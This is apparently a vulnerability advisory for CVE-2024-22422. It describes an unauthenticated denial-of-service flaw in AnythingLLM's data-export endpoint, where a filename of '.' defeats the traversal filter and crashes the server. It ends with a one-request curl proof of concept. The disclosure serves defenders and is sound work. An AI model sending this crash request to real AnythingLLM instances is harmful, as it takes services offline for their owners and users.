---
description: CVE-2024-22422, HIGH, An API route (file export) can allow an unauthenticated attacker to crash the AnythingLLM server resulting in a denial of service attack.
title: AnythingLLM Unhandled Exception DoS
date_published: "2024-01-22"
last_updated: "2024-01-22"
xray_id:
vul_id: CVE-2024-22422
cvss: 7.5
severity: high
discovered_by: Natan Nehorai
type: vulnerability

---

## Summary

An API route (file export) can allow an unauthenticated attacker to crash the AnythingLLM server resulting in a denial of service attack.

## Component

[AnythingLLM](https://github.com/Mintplex-Labs/anything-llm)



## Affected versions

No version tags. Fixed in commit [08d33cf](https://github.com/Mintplex-Labs/anything-llm/commit/08d33cfd8fc47c5052b6ea29597c964a9da641e2)



## Description

The “data-export” endpoint is used to export files using the filename parameter as user input.

The endpoint takes the user input, filters it to avoid directory traversal attacks, fetches the file from the server, and afterwards deletes it.

An attacker can trick the input filter mechanism to point to the current directory, and while attempting to delete it the server will crash as there is no error-handling wrapper around it.

Moreover, the endpoint is public and does not require any form of authentication, resulting in an unauthenticated Denial of Service issue, which crashes the instance using a single HTTP packet.



## PoC

As the API endpoint is unauthenticated there is only a need for a single HTTP request to crash the server:

```shell
curl -i -s -k -X $'GET' \
-H $'Host: localhost:3001' \
-H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' \
-H $'Accept: */*' \
-H $'Accept-Language: en-US,en;q=0.5' \
-H $'Accept-Encoding: gzip, deflate' \
-H $'Connection: close' \
$'http://localhost:3001/api/system/data-exports/.'
```



## Vulnerability Mitigations

No mitigations are supplied for this issue



## References

[Advisory](https://github.com/Mintplex-Labs/anything-llm/security/advisories/GHSA-xmj6-g32r-fc5q)

[Fix commit](https://github.com/Mintplex-Labs/anything-llm/commit/08d33cfd8fc47c5052b6ea29597c964a9da641e2)
